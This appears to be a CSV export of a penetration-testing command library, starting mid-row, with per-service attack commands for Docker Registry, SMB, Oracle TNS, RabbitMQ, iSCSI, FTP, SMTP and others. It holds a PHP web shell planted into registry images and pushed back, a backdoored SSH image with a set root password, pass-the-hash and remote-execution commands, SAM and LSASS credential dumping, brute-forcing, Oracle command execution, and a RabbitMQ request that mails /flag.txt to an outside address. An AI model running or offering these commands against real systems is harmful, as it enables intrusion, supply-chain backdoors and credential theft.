Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
         ""protected"": ""eyJmb3JtYXRMZW5ndGgiOjI1NjQsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wMS0wMVQyMDoxMTowNFoifQ""
      }
   ]
}

#Download one of the previously listed blobs
curl http://10.10.10.10:5000/v2/ubuntu/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output blob1.tar

#Inspect the insides of each blob
tar -xf blob1.tar #After this,inspect the new folders and files created in the current directory
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"#Once you know which images the server is saving (/v2/_catalog) you can pull them
docker pull 10.10.10.10:5000/ubuntu

#Check the commands used to create the layers of the image
docker history 10.10.10.10:5000/ubuntu
#IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
#ed05bef01522        2 years ago         ./run.sh                                        46.8MB              
#<missing>           2 years ago         /bin/sh -c #(nop)  CMD [""./run.sh""]             0B                  
#<missing>           2 years ago         /bin/sh -c #(nop)  EXPOSE 80                    0B                  
#<missing>           2 years ago         /bin/sh -c cp $base/mysql-setup.sh /            499B                
#<missing>           2 years ago         /bin/sh -c #(nop) COPY dir:0b657699b1833fd59…   16.2MB       

#Run and get a shell
docker run -it 10.10.10.10:5000/ubuntu bash #Leave this shell running
docker ps #Using a different shell
docker exec -it 7d3a81fe42d7 bash #Get ash shell inside docker container
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"# <?php echo shell_exec($_GET[""cmd""]); ?>
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"FROM 10.10.10.10:5000/wordpress
COPY shell.php /app/
RUN chmod 777 /app/shell.php
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"docker build -t 10.10.10.10:5000/wordpress .
 #Create
docker images
docker push registry:5000/wordpress #Push it
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"docker pull 10.10.10.10:5000/sshd-docker-cli
docker run -d 10.10.10.10:5000/sshd-docker-cli
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"docker cp 4c989242c714:/etc/ssh/sshd_config .
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"FROM 10.10.10.10:5000/sshd-docker-cli
COPY sshd_config /etc/ssh/
RUN echo root:password | chpasswd
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"docker build -t 10.10.10.10:5000/sshd-docker-cli .
 #Create
docker images
docker push registry:5000/sshd-docker-cli #Push it
",Unverified,1
WHOIS,43,None,NoNameAdded,No Description,"whois -h <HOST> -p <PORT> ""domain.tld""
echo ""domain.ltd"" | nc -vn <HOST> <PORT>
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"nbtscan -r 192.168.0.1/24
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo ""Usage: ./smbver.sh RHOST {RPORT}"" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i ""samba\|s.a.m"" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n ""$rhost: "" &
echo ""exit"" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo """" && sleep .1
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"# msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#Dump interesting information
enum4linux -a [-u ""<username>"" -p ""<passwd>""] <IP>
nmap --script ""safe or smb-enum-*"" -p 445 <IP>

#Connect to the rpc
rpcclient -U """" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"smbclient --no-pass -L //{IP} # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //{IP} #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
smbmap -H {IP} [-P <PORT>] #Null user
smbmap -u ""username"" -p ""password"" -H {IP} [-P <PORT>] #Creds
smbmap -u ""username"" -p ""<NT>:<LM>"" -H {IP} [-P <PORT>] #Pass-the-Hash
crackmapexec smb {IP} -u '' -p '' --shares #Null user
crackmapexec smb {IP} -u 'username' -p 'password' --shares #Guest user
crackmapexec smb {IP} -u 'username' -H '<HASH>' --shares #Guest user
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u ""username"" -p ""password""] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u ""username"" -p ""password""] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u ""username"" -p ""<NT>:<LM>"" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"smbclient -U '%' -N \\\\{IP}\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\{IP}\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
    output=$(smbclient -U '%' -N \\\\$ip\\$share -c '') 

    if [[ -z $output ]]; then 
        echo ""[+] creating a null session is possible for $share"" # no output if command goes through, thus assuming that a session was created
    else
        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
    fi
done
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o ""username=user,password=password"" //x.x.x.x/share /mnt/share
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#Download all
smbclient //<IP>/<share>
> mask """"
> recurse
> prompt
> mget *
#Download everything to current directory
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"# sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"# apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"# ./atexec.py [[domain/]username[:password]@]<targetName or address> ""command""
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 ""whoami""
",Unverified,1
SMB,139,None,NoNameAdded,No Description,"nmap --script smb-brute -p 445 {IP}
ridenum.py {IP} 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusername
",Unverified,1
Modbus,502,None,NoNameAdded,No Description,"nmap --script modbus-discover -p 502 {IP}
msf> use auxiliary/scanner/scada/modbusdetect
msf> use auxiliary/scanner/scada/modbus_findunitid
",Unverified,1
Management,15672,None,NoNameAdded,No Description,"# POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
Host: 172.32.56.72:15672
Authorization: Basic dGVzdDp0ZXN0
Accept: */*
Content-Type: application/json;charset=UTF-8
Content-Length: 267

{""vhost"":""/"",""name"":""amq.default"",""properties"":{""delivery_mode"":1,""headers"":{}},""routing_key"":""email"",""delivery_mode"":""1"",""payload"":""{\""to\"":\""zevtnax+ppp@gmail.com\"", \""attachments\"": [{\""path\"": \""/flag.txt\""}]}"",""headers"":{},""props"":{},""payload_encoding"":""string""}
",Unverified,1
ISCSI,3260,None,NoNameAdded,No Description,"# sudo apt-get install open-iscsi
",Unverified,1
ISCSI,3260,None,NoNameAdded,No Description,"iscsiadm -m node --targetname=""iqn.1992-05.com.emc:fl1001433000190000-3-vnxe"" -p 123.123.123.123:3260 --login
Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] (multiple)
Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.
",Unverified,1
ISCSI,3260,None,NoNameAdded,No Description,"iscsiadm -m node --targetname=""iqn.1992-05.com.emc:fl1001433000190000-3-vnxe"" -p 123.123.123.123:3260 --logout
Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260]
Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.
",Unverified,1
ISCSI,3260,None,NoNameAdded,No Description,"iscsiadm -m node --targetname=""iqn.1992-05.com.emc:fl1001433000190000-3-vnxe"" -p 123.123.123.123:3260
# BEGIN RECORD 2.0-873
node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
node.tpgt = 1
node.startup = manual
node.leading_login = No
iface.hwaddress = <empty>
iface.ipaddress = <empty>
iface.iscsi_ifacename = default
iface.net_ifacename = <empty>
iface.transport_name = tcp
iface.initiatorname = <empty>
iface.bootproto = <empty>
iface.subnet_mask = <empty>
iface.gateway = <empty>
iface.ipv6_autocfg = <empty>
iface.linklocal_autocfg = <empty>
iface.router_autocfg = <empty>
iface.ipv6_linklocal = <empty>
iface.ipv6_router = <empty>
iface.state = <empty>
iface.vlan_id = 0
iface.vlan_priority = 0
iface.vlan_state = <empty>
iface.iface_num = 0
iface.mtu = 0
iface.port = 0
node.discovery_address = 192.168.xx.xx
node.discovery_port = 3260
node.discovery_type = send_targets
node.session.initial_cmdsn = 0
node.session.initial_login_retry_max = 8
node.session.xmit_thread_priority = -20
node.session.cmds_max = 128
node.session.queue_depth = 32
node.session.nr_sessions = 1
node.session.auth.authmethod = None
node.session.auth.username = <empty>
node.session.auth.password = <empty>
node.session.auth.username_in = <empty>
node.session.auth.password_in = <empty>
node.session.timeo.replacement_timeout = 120
node.session.err_timeo.abort_timeout = 15
node.session.err_timeo.lu_reset_timeout = 30
node.session.err_timeo.tgt_reset_timeout = 30
node.session.err_timeo.host_reset_timeout = 60
node.session.iscsi.FastAbort = Yes
node.session.iscsi.InitialR2T = No
node.session.iscsi.ImmediateData = Yes
node.session.iscsi.FirstBurstLength = 262144
node.session.iscsi.MaxBurstLength = 16776192
node.session.iscsi.DefaultTime2Retain = 0
node.session.iscsi.DefaultTime2Wait = 2
node.session.iscsi.MaxConnections = 1
node.session.iscsi.MaxOutstandingR2T = 1
node.session.iscsi.ERL = 0
node.conn[0].address = 192.168.xx.xx
node.conn[0].port = 3260
node.conn[0].startup = manual
node.conn[0].tcp.window_size = 524288
node.conn[0].tcp.type_of_service = 0
node.conn[0].timeo.logout_timeout = 15
node.conn[0].timeo.login_timeout = 15
node.conn[0].timeo.auth_timeout = 45
node.conn[0].timeo.noop_out_interval = 5
node.conn[0].timeo.noop_out_timeout = 5
node.conn[0].iscsi.MaxXmitDataSegmentLength = 0
node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144
node.conn[0].iscsi.HeaderDigest = None
node.conn[0].iscsi.DataDigest = None
node.conn[0].iscsi.IFMarker = No
node.conn[0].iscsi.OFMarker = No
# END RECORD
",Unverified,1
AFP,548,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/afp/afp_server_info
nmap -sV --script ""afp-* and not dos and not brute"" -p <PORT> <IP>
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"nmap --script ""oracle-tns-version"" -p 1521 -T4 -sV {IP}
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h {IP}
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"tnscmd10g status-p 1521 -h {IP} #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost {IP}
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost {IP}
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 {IP} oracle-sid
patator oracle_login host={IP} sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"#apt install oscanner
oscanner -s <IP> -P <PORT>
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# ./odat.py java -s {IP} -U <username> -P <password> -d <SID> --exec COMMAND
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# ./odat.py dbmsscheduler -s {IP} -d <SID> -U <username> -P <password> --exec ""C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK""
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# ./odat.py externaltable -s {IP} -U <username> -P <password> -d <SID> --exec ""C:/windows/system32"" ""calc.exe""
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# ./odat.py utlfile -s {IP} -d <SID> -U <username> -P <password> --getFile ""C:/test"" token.txt token.txt
./odat.py externaltable -s {IP} -U <username> -P <password> -d <SID> --getFile ""C:/test"" ""my4.txt"" ""my""
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# ./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
",Unverified,1
Listener,1521,None,NoNameAdded,No Description,"# msf> use auxiliary/sqli/oracle/lt_findricset_cursor
",Unverified,1
FTP,21,None,NoNameAdded,No Description,"telnet -vn {IP} 21
openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any
",Unverified,1
FTP,21,None,NoNameAdded,No Description,"ftp {IP}
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
",Unverified,1
FTP,21,None,NoNameAdded,No Description,"ftp://anonymous:anonymous@10.10.10.98
",Unverified,1
FTP,21,None,NoNameAdded,No Description,"wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
",Unverified,1
SMTP/s,25,None,NoNameAdded,No Description,"# nc -vn {IP} 25
",Unverified,1
SMTP/s,25,None,NoNameAdded,No Description,"openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
",Unverified,1
SMTP/s,25,None,NoNameAdded,No Description,"dig +short mx google.com
",Unverified,1
SMTP/s,25,None,NoNameAdded,No Description,"nmap -p25 --script smtp-commands 10.10.10.10
",Unverified,1
SMTP/s,25,None,NoNameAdded,No Description,"root@kali: telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
>> AUTH NTLM 334 
NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
",Unverified,1
SMTP/s,25,None,NoNameAdded,No Description,"# $ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
",Unverified,1
